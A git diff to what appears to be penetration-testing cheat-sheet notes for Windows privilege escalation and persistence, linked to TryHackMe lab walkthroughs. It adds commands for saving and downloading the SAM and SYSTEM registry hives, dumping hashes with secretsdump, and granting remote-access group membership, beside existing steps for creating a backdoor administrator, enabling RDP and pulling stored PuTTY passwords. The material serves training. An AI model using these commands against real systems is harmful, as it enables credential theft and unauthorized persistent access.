@@ -56,7 +56,7 @@ type C:\Windows\path\to\file\$FILE | findstr $STRING
 |                         |                                                         |                                                                   |
 |                         |                                                         |                                                                   |
 
-###
+
 
 ## Harvesting Passwords from Usual Spots
 
@@ -101,7 +101,40 @@ Retrieve the saved password stored in the saved PuTTY session under your profile
 reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 ```
 
-## Add User
+
+
+### System and Sam
+
+#### Download system and sam
+
+**Examples**
+
+[#tampering-with-unprivileged-accounts](../../walkthroughs/tryhackme/windows-local-persistence.md#tampering-with-unprivileged-accounts "mention")
+
+**Kali(WinRM)**
+
+```
+reg save hklm\system system.bak
+reg save hklm\sam sam.bak
+download system.bak
+download sam.bak
+```
+
+#### Dump hashes
+
+**Examples**
+
+[#tampering-with-unprivileged-accounts](../../walkthroughs/tryhackme/windows-local-persistence.md#tampering-with-unprivileged-accounts "mention")
+
+**Kali**
+
+```
+python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
+```
+
+
+
+## Add User & Assign Group Memberships
 
 **Victim**
 
@@ -111,7 +144,7 @@ net localgroup Administrators backdoor /add
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v forceguest /t reg_dword /d 0 /f
 ```
 
-**Enable RDP**
+### **Enable RDP**
 
 **Victim**
 
@@ -119,11 +152,25 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v forceguest /t reg_dword /d 
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 ```
 
+### Add user to RDP Group
+
+**Examples**
+
+[#assign-group-memberships](../../walkthroughs/tryhackme/windows-local-persistence.md#assign-group-memberships "mention")
+
+Add user to group that allows them to RDP
+
+**Victim(cmd)**
+
+```
+net localgroup "Remote Management Users" $USER /add
+```
+
 ## Scheduled Tasks
 
 **Examples**
 
-[windows-privilege-escalation.md](../../walkthroughs/tryhackme/windows-privilege-escalation.md "mention")
+[windows-privilege-escalation.md](../../walkthroughs/tryhackme/windows-privilege-escalation.md "mention")[#abusing-scheduled-tasks](../../walkthroughs/tryhackme/windows-local-persistence.md#abusing-scheduled-tasks "mention")
 
 Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.
 
@@ -142,8 +189,6 @@ schtasks /query /tn $TASK /fo list /v
 ```
 
 <figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
-
-
 
 **Victim(cmd)**
 
